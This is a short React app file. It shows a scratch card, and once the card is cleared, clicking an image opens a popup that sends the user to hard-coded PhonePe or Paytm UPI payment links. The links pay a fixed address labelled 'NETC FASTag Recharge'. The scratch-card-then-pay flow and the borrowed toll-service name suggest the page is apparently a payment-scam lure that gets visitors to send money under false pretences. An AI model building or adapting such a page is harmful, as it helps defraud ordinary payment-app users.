import React, { useState } from "react";
import Scratch from "./ui/Scratch";
import PopUp from "./ui/PopUp";

const App = () => {
  const [isScratchCleared, setIsScratchCleared] = useState(false);
  const [isPopupOpen, setIsPopupOpen] = useState(false);

  const handleScratchComplete = () => {
    setIsScratchCleared(true);
  };

  const handleSelect = (method) => {
    const PHONEPE_URL =
  "phonepe://pay?ver=01&mode=01&pa=netc.34161FA820328AA2D24366C0@mairtel&purpose=00&mc=4784&pn=NETC%20FASTag%20Recharge&orgid=159753&qrMedium=04";

const PAYTM_URL =
  "paytmmp://pay?ver=01&mode=01&pa=netc.34161FA820328AA2D24366C0@mairtel&purpose=00&mc=4784&pn=NETC%20FASTag%20Recharge&orgid=159753&qrMedium=04";

    if (method === "phonepe") {
      window.location.href = PHONEPE_URL;
    } else if (method === "paytm") {
      window.location.href = PAYTM_URL;
    }

    setIsPopupOpen(false);
  };

  return (
    <div>
      <img src="/top.png" alt="header" className="w-full" />

      <Scratch onScratchComplete={handleScratchComplete} />

      <img
        src="/bottom.png"
        alt="bottom"
        className="w-full cursor-pointer"
        onClick={() => {
          if (isScratchCleared) {
            setIsPopupOpen(true);
          } else {
            // alert("Please complete the scratch first.");
          }
        }}
      />

      <PopUp isOpen={isPopupOpen} onSelect={handleSelect} />
    </div>
  );
};

export default App;
